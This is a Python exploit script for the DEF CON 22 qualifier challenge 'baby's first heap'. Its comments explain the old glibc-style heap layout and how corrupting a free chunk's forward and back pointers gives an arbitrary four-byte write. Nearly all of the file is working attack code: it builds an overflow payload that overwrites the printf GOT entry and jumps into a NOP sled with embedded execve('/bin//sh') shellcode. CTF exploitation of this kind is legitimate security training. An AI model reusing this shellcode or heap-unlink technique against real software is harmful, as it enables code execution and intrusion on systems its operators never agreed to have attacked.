"""
Exploit to get shell on baby's first heap (Defcon 22 Quals)

Author: clu (notclu@gmail.com)
"""

import struct
import sys
import re

sys.path.append('../../tools')

import ctf

HOST = 'arch'
PORT = 8888

exec_shell = (
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68"
"\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
)

def get_allocations(lines):
    return [int(loc,16) for loc in re.findall('loc=([0-9A-F]+)',lines, re.MULTILINE)]

# This challenge uses an old GNU libc heap implementation
# more details @ http://phrack.org/issues/57/9.html#article

def main():
    s = ctf.connect(HOST,PORT)

    recv_data = ''
    while True:
        data = ctf.recv(s, 1024, dump=False)

        if not data:
            break
        else:
            recv_data += data

            if 'Write' in data:
                break

    allocs = get_allocations(recv_data)

    # We always write into allocation 10
    offset_to_next_header = allocs[11] - allocs[10] - 8
    print('Offset to next header = %d' % offset_to_next_header)

    # The heap layout looks like
    # ptr-8: Previous Chunk Size
    # ptr-4: Chunk Size (bit 0 is set if the previous chunk is used)
    # ptr-0: Data
    #
    # The heap implemention always adds 4 Byte to the size
    # and aligns to the next 8 Byte boundry
    # alloc_size = ((size+4)&0xfffffffe)+8
    #
    # After freeing the heap implementation will keep old blocks for reuse
    # The header changes to:
    # ptr-8: Previous Chunk Size
    # ptr-4: Chunk Size
    # ptr-0: Pointer to free list (forward)
    # ptr+4: Pointer to free list (back)
    # ptr+8: Old data is not cleaned up here (SHELLCODE goes here)

    # We can get an arbitrary 4 Byte write by setting the forward and backward
    # pointers in the header. See
    # .text:080493F6                 mov     [eax+8], edx    ;  *(next->forward + 8) = next->bk
    payload = struct.pack('I', 0x0804C004-8) #eax (got entry for printf)
    payload += struct.pack('I', allocs[10]+8) # edx (shellcode location)
    payload += '\x90' * 100
    payload += exec_shell
    payload += '\x90' * (offset_to_next_header-len(payload))
    # Overwrite the sizes in the next header will small number with bit 0=0
    # The low bit must be 0 to trigger free chunk merging
    payload += struct.pack('I', 100)

    ctf.send(s, payload + '\n')

    # Now the app will free the allocated blocks triggering the arbitrary write
    # during block merging

    ctf.recv(s)

if __name__ == '__main__':
    main()
